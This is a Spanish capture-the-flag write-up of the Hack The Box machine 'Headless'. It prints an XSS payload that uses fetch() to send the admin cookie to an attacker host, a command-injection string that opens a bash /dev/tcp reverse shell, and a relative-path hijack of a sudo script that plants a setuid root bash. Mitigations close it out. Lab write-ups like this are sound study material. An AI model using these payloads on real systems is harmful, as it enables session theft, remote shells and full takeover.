---
machine: Headless
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, xss, cookie, command-injection, relative-path, privesc]
---

# Headless — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El sitio de `headless.htb` tiene un formulario de contacto que refleja el HTML y avisa de que las cabeceras de la petición se reenvían para su análisis. Un payload XSS colocado en una cabecera (`User-Agent`) se ejecuta en el navegador del administrador y roba su cookie `is_admin`. Con esa cookie se entra al dashboard, cuyo formulario de diagnóstico tiene command injection y devuelve una shell como `dvir`. Para root, `dvir` puede ejecutar con `sudo` un script `syscheck` que llama a `./initdb.sh` con ruta relativa; se coloca un `initdb.sh` propio en el directorio de trabajo y se ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22` OpenSSH 9.2p1 Debian 2+deb12u2.
- `5000` un servicio HTTP identificado como `upnp?` por nmap; es la aplicación web.
- El sitio se sirve como `headless.htb`; se añade a `/etc/hosts`.

```bash
feroxbuster -u http://headless.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Aparecen la página principal, el formulario de contacto y el dashboard, que redirige al login si no hay sesión de administrador.

## Enumeración

El formulario de contacto envía un correo y muestra un aviso: si se incluyen etiquetas HTML, el servidor responde que las cabeceras de la petición se han reenviado para análisis. Ese mensaje indica que el `User-Agent` y otras cabeceras se almacenan y se muestran al administrador.

Se prueba el reflejo con una etiqueta simple y se confirma que el valor se interpreta. El dashboard solo es accesible con la cookie de administrador, así que el objetivo es robarla.

## Foothold

Se levanta un servidor propio y se envía el formulario con un `User-Agent` que carga un script:

```http
User-Agent: <script>fetch('http://<LHOST>/?c='+document.cookie)</script>
```

Cuando el administrador revisa la consulta, el script se ejecuta y la petición llega con su cookie. Se reutiliza la cookie en el navegador o con `curl`:

```bash
curl -s http://headless.htb/dashboard -H "Cookie: <COOKIE>"
```

El dashboard tiene un formulario que comprueba el estado de un host o servicio. El parámetro se pasa sin sanear a una llamada del sistema, así que un separador de comandos ejecuta lo que se indique:

```text
<IP>; id
<IP>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

La shell es de `dvir`.

## Movimiento lateral

No hay otro host. `dvir` tiene un home pequeño y un directorio `app` con el código del sitio. La enumeración se centra en los permisos y en los scripts que se ejecutan con privilegios.

## Escalada de privilegios

`sudo -l` muestra que `dvir` puede ejecutar `/usr/bin/syscheck` como root. El script comprueba que se ejecuta como root, verifica si el servicio de base de datos está activo y, si no lo está, llama a `./initdb.sh` con ruta relativa. El binario no cambia de directorio, así que busca el script en el directorio de trabajo actual.

Se crea un `initdb.sh` en `/dev/shm` que copia `bash`, le da propietario root y el bit setuid, y se ejecuta `syscheck` desde ese directorio:

```bash
cd /dev/shm
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchown root:root /tmp/rootbash\nchmod 6777 /tmp/rootbash\n' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/tmp/rootbash -p
```

Como el script se interpreta con privilegios de root, la copia de `bash` queda setuid y devuelve una shell efectiva de root.

## Evidencia

- Aviso del formulario sobre el reenvío de cabeceras.
- Petición recibida con la cookie del administrador.
- Acceso al dashboard con esa cookie.
- Ejecución de `id` y reverse shell como `dvir`.
- `sudo -l` con `/usr/bin/syscheck`.
- `initdb.sh` propio ejecutado y `id` con UID 0.

## Lecciones aprendidas

- Las cabeceras HTTP son entrada de usuario y también se deben escapar al mostrarse.
- Robar una cookie de administrador puede valer más que un RCE inicial.
- Un formulario de diagnóstico que llama al sistema es command injection directo.
- Una ruta relativa en un script privilegiado permite secuestrar el binario que ejecuta.
- `sudo` sobre un script no es seguro si el script depende del directorio actual.

## Mitigaciones y detección

- Escapar todas las cabeceras y campos reflejados; usar plantillas con autoescape.
- Marcar las cookies de sesión como `HttpOnly`, `Secure` y `SameSite`.
- No pasar entrada del usuario a `system`, `exec` o `popen`; usar APIs y listas de permitidos.
- Usar rutas absolutas en scripts privilegiados y validar el propietario y los permisos.
- Evitar `sudo` sobre scripts que lean archivos del directorio actual.
- Alertar de peticiones con separadores de comandos y de procesos web que lanzan shells.

## Referencias

- [0xdf — Headless](https://0xdf.gitlab.io/2024/07/20/htb-headless.html)
- [IppSec — Headless](https://www.youtube.com/watch?v=FDCpJbS1OuQ)
- [Hack The Box — Headless](https://app.hackthebox.com/machines/headless)
- [Knowledge — XSS almacenado y cookie de admin](../../../knowledge/web/stored-xss-admin-cookie.md)
